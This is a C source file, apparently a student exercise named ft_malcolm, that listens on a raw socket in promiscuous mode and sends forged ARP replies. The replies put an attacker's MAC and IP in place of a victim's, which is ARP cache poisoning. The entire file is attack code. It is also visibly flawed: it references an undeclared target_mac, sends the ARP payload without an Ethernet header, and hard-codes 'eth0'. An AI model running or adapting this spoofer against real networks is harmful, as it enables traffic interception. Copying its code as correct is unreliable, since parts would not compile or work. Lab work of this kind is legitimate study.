/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   malcolm.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
/*   Updated: 2025/11/18 11:27:06 by nponchon         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incs/ft_malcolm.h"

extern int g_sigint;

struct ether_arp	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
{
	struct ether_arp forged_arp;

	ft_memcpy(&forged_arp, original_arp, sizeof(struct ether_arp));
	forged_arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

	// Set sender MAC and IP to attacker's values
	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&forged_arp.arp_sha[0], &forged_arp.arp_sha[1], &forged_arp.arp_sha[2],
		&forged_arp.arp_sha[3], &forged_arp.arp_sha[4], &forged_arp.arp_sha[5]);

	inet_pton(AF_INET, m->source_ip, forged_arp.arp_spa);

	// Set target MAC and IP to victim's values
	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&forged_arp.arp_tha[0], &forged_arp.arp_tha[1], &forged_arp.arp_tha[2],
		&forged_arp.arp_tha[3], &forged_arp.arp_tha[4], &forged_arp.arp_tha[5]);

	inet_pton(AF_INET, m->target_ip, forged_arp.arp_tpa);

	printf("Forged ARP reply:\n");
	printf("  Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
		forged_arp.arp_sha[0], forged_arp.arp_sha[1], forged_arp.arp_sha[2],
		forged_arp.arp_sha[3], forged_arp.arp_sha[4], forged_arp.arp_sha[5]);
	printf("  Sender IP: %s\n", m->source_ip);
	printf("  Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
		forged_arp.arp_tha[0], forged_arp.arp_tha[1], forged_arp.arp_tha[2],
		forged_arp.arp_tha[3], forged_arp.arp_tha[4], forged_arp.arp_tha[5]);
	printf("  Target IP: %s\n", m->target_ip);
	printf("  Operation: ARP Reply\n");

	return (forged_arp);
}

void	send_arp(t_malcolm *m, unsigned char *buf)
{
	struct sockaddr_ll dest_addr = {0};
	dest_addr.sll_ifindex = if_nametoindex("eth0"); // Replace "eth0" with your interface name
	printf("Interface index: %d\n", dest_addr.sll_ifindex);
	dest_addr.sll_halen = ETH_ALEN; // Ethernet address length
	ft_memcpy(dest_addr.sll_addr, target_mac, ETH_ALEN); // Set target MAC address

	struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ether_header));
	char sender_ip[INET_ADDRSTRLEN];
    char target_ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));
    inet_ntop(AF_INET, arp->arp_tpa, target_ip, sizeof(target_ip));
	printf("Sending forged ARP reply to %s\n", target_ip);

	struct ether_arp forged_arp = forge_arp(arp, m);
	ssize_t bytes_sent = sendto(m->socket, &forged_arp, sizeof(forged_arp), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
	if (bytes_sent < 0) {
		perror("sendto failed");
	} else {
		printf("Successfully sent forged ARP reply (%zd bytes)\n", bytes_sent);
	}

	return ;
}

int	listen_arp(t_malcolm *m)
{
    m->socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));	// ETH_P_ARP to capture ARP packets only
    if (m->socket < 0) {
	    fprintf(stderr, "Error: unable to create raw socket\n");
	    return (free_malcolm(m), 1);
    }

	// This might not be necessary since we need to send a reply at the first ARP request, ie. ignore container B's reply.
    struct packet_mreq mreq = {0};
    mreq.mr_ifindex = 0;	// 0 means all interfaces
    mreq.mr_type = PACKET_MR_PROMISC;	// set promiscuous mode to capture also non-broadcast packets, eg. unicast ARP replies 
    setsockopt(m->socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq));

    unsigned char buf[65536];
    struct sockaddr_ll addr;
    socklen_t addrlen = sizeof(addr);

    printf("Starting to listen for packets between A and B...\n");

    while (g_sigint == 0) {
        ssize_t len = recvfrom(m->socket, buf, sizeof(buf), 0,
                            (struct sockaddr*)&addr, &addrlen);
        if (len < 0)
			continue;

        struct ether_header *eth = (struct ether_header*)buf;
        if (ntohs(eth->ether_type) == ETH_P_ARP) 
			break;
    }

	print_arp(buf);
	send_arp(m, buf);

    return (0);
}
